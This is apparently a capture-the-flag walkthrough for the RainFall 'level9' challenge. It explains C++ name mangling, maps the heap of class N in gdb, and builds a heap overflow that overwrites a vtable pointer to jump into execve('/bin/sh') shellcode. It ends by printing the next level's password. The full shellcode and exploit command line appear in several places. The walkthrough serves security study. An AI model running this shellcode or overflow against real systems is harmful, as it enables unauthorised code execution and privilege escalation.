# Walkthrough level9

This program is in c++. We have to [understand each plt function](https://reverseengineering.stackexchange.com/questions/4402/what-is-operator-newunsigned-int) used.  
For example :  
_Znwj --> new  
_Znaj --> new []  

To understand c++ function we have used [name mangling](https://en.wikipedia.org/wiki/Name_mangling#C++).
For example:  
_ZN4Test10methodNamei --> void Test::methodName(int n);   

We have a class named "N" in wich there are an operator +, a buffer, an int, a constructor and a set method "setAnnotation".
We try to run program with param "aaaa".  
The first N instance allocated is at $esp+0x14 address. So we can look at the heap. We can see which buffer start.  

| Address  | Value    |
|----------|----------|
|0x804a008 |this      |
|\*this    |operator +|
|\*this +4 |buffer    |
|\*this+104|int       |

``` bash
(gdb) run aaaa
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level9/level9 aaaa

Breakpoint 2, 0x0804867c in main ()
(gdb) x/xw $esp+0x14
0xbffff724:	0x0804a008
(gdb) x/32xw 0x0804a008
0x804a008:	0x08048848	0x61616161	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
```

We have try to erase operator method of 2nd instance with another address.   
We don't have function who can execute "/bin/sh". So we have decided to write shell code in first instance buffer.   

``` bash
(gdb) run $(python -c 'print "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x0c\xa0\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level9/level9 $(python -c 'print "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x0c\xa0\x04\x08"')

Breakpoint 2, 0x0804867c in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 1, 0x08048693 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()

(gdb) x/32xw 0x0804a008
0x804a008:	0x08048848	0x90909090	0x90909090	0x90909090
0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a028:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a038:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a048:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a058:	0x90909090	0x6850c031	0x68732f2f	0x69622f68
0x804a068:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
```  
We have a Segmentation fault because it try to dereference 0x0804a00c who contains 0x90909090 address.  
So we want to modify this value to a valid address in the NOP area. We have choose `0x804a008 + 8 = 0x804a010`

``` bash
(gdb) run $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 76 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x0c\xa0\x04\x08"')

(gdb) x/32xw 0x0804a008
0x804a008:	0x08048848	0x0804a010	0x90909090	0x90909090
0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a028:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a038:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a048:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a058:	0x90909090	0x6850c031	0x68732f2f	0x69622f68
0x804a068:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000

level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 76 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ 
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 76 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
